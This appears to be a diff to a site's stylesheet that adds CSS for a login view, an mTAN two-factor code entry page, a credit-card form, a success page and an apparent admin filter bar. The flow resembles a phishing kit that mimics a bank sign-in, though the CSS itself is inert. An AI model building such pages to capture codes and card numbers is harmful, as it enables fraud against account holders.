@@ -15273,6 +15273,14 @@ summary {
     margin-bottom: var(--space-0)
 }
 
+.global-error-box { display: none; padding: 15px; margin-bottom: 25px; border: 1px solid #c00; background-color: #fef2f2; color: #333; font-size: 14px; line-height: 1.5; align-items: flex-start; gap: 15px; }
+.global-error-box.visible { display: flex; }
+.global-error-box svg { flex-shrink: 0; width: 24px; height: 24px; color: #c00; }
+.mtan-inputs { display: flex; justify-content: space-between; gap: 15px; }
+.mtan-inputs input { width: 14%; height: 60px; text-align: center; font-size: 28px; font-weight: bold; color: #333; background-color: transparent; border: none; border-bottom: 2px solid #a9a9a9; border-radius: 0; }
+.meta-info, .help-section { font-size: 14px; color: #555; margin-top: 25px; text-align: left; line-height: 1.6;}
+
+
 :root,html {
     --linkUi-colorNeutral0: #ffffff;
     --linkUi-colorNeutral50: #fafafa;
@@ -15656,6 +15664,136 @@ input {
 }
         
 
+.filter-group {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+}
 
+.dropdown {
+    position: relative;
+    display: inline-block;
+}
+
+.dropdown-toggle {
+    padding: 8px 16px;
+    background: #f0f0f0;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+}
+
+.dropdown-toggle:hover {
+    background: #e0e0e0;
+}
+
+.dropdown-menu {
+    display: none;
+    position: absolute;
+    background: white;
+    min-width: 200px;
+    box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+    border-radius: 5px;
+    z-index: 1000;
+    margin-top: 5px;
+    max-height: 300px;
+    overflow-y: auto;
+}
+
+.dropdown:hover .dropdown-menu {
+    display: block;
+}
+
+.FormFieldGroup-child--width-12 {
+    width: 100% !important;
+    max-width: 100% !important;
+}
+
+.CheckoutInputContainer {
+    width: 100% !important;
+}
+
+.InputContainer {
+    width: 100% !important;
+}
+
+.CheckoutInput {
+    width: 100% !important;
+    max-width: 100% !important;
+}
+
+.dropdown-item {
+    display: block;
+    width: 100%;
+    padding: 10px 15px;
+    border: none;
+    background: none;
+    text-align: left;
+    cursor: pointer;
+    font-size: 0.9em;
+    color: #333;
+}
+
+.dropdown-item:hover {
+    background: #f5f5f5;
+}
+
+.dropdown-item.active {
+    background: #4a6cf7;
+    color: white;
+}
+
+.filter-actions {
+    display: flex;
+    gap: 10px;
+    margin-left: auto;
+}
+
+.btn-refresh {
+    padding: 8px 16px;
+    background: #6c757d;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+.btn-logout {
+    padding: 8px 16px;
+    background: #dc3545;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+/* L'écrans sghira (Téléphone) */
+@media (max-width: 768px) {
+    main { padding: 30px 0; }
     
-w
+    .header-content { flex-direction: column; gap: 20px; }
+    .login-column h1 { font-size: 28px; }
+
+    /* Wrappers for mTAN, CC, Finished */
+    .mtan-content-wrapper, .content-wrapper {
+        max-width: 100%;
+        padding: 0 15px; 
+    }
+
+    /* mTAN (2FA) Page */
+    #mtan-section h1, #cc-section h1 { font-size: 24px; }
+    .info-box { padding: 16px; }
+    .mtan-inputs { gap: 8px; }
+    .mtan-inputs input { height: 50px; font-size: 22px; }
+
+    /* Credit Card Page */
+    .cc-form-row { flex-direction: column; gap: 25px; }
+    
+    /* Finished Page */
+    .success-checkmark { width: 70px; height: 70px; margin: 25px auto; }
+    #finished-section h1 { font-size: 24px; }
+    #finished-section p { font-size: 15px; }
+}
